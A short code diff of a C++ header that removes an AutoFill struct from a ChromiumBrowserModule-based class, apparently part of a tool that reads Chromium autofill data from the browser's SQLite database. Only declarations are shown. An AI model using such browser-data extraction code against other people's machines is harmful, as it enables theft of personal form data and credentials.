@@ -9,11 +9,6 @@
 #include "../ChromiumBrowserModule.h"
 #include "sqlite3.h"
 
-struct AutoFill {
-    std::string name;
-    std::string value;
-};
-
 class CAutoFill : public ChromiumBrowserModule {
 public:
     void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
